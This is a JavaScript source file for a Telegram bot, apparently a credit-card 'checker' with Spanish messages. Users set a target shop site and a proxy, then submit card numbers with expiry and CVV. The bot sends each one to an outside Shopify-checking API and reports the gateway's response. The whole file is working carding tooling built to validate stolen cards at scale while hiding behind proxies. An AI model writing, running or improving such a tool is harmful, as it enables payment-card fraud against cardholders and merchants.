require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const BOT_TOKEN = process.env.BOT_TOKEN;
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// memoria simple por chat
const config = {}; // chatId => { site, proxy }

/* ================= START ================= */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Configura primero:
• /setsite https://site.com
• /setproxy ip:port:user:pass

Luego usa:
• /chk cc|mm|yy|cvv
• varios CC (uno por línea)`
  );
});

/* ================= SET SITE ================= */
bot.onText(/\/setsite (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  config[chatId] = config[chatId] || {};
  config[chatId].site = match[1].trim();

  bot.sendMessage(chatId, `✅ Site guardado:\n${config[chatId].site}`);
});

/* ================= SET PROXY ================= */
bot.onText(/\/setproxy (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  config[chatId] = config[chatId] || {};
  config[chatId].proxy = match[1].trim();

  bot.sendMessage(chatId, `✅ Proxy guardado`);
});

/* ================= CHK ================= */
bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const conf = config[chatId];

  if (!conf || !conf.site || !conf.proxy) {
    return bot.sendMessage(
      chatId,
      '❌ Falta configuración\nUsa /setsite y /setproxy'
    );
  }

  let input = match[1].trim();
  if (!input) {
    return bot.sendMessage(chatId, '❌ No enviaste CC');
  }

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);

  bot.sendMessage(chatId, `⏳ Procesando ${ccs.length} check(s)...`);

  for (let i = 0; i < ccs.length; i++) {
    const cc = ccs[i];

    const url =
      `${API_BASE}?site=${encodeURIComponent(conf.site)}` +
      `&cc=${encodeURIComponent(cc)}` +
      `&proxy=${encodeURIComponent(conf.proxy)}`;

    try {
      const res = await axios.get(url, { timeout: 30000 });
      const d = res.data;

      const msgTxt =
        `━━━━━━━━━━━━━━\n` +
        `🧪 CHK ${i + 1}\n` +
        `💳 ${cc}\n` +
        `🏪 ${d.Gateway}\n` +
        `💰 ${d.Price}\n` +
        `📤 ${d.Response}`;

      bot.sendMessage(chatId, msgTxt);
    } catch (e) {
      bot.sendMessage(chatId, `❌ Error en CHK ${i + 1}`);
    }
  }
});

console.log('🤖 Bot iniciado correctamente');
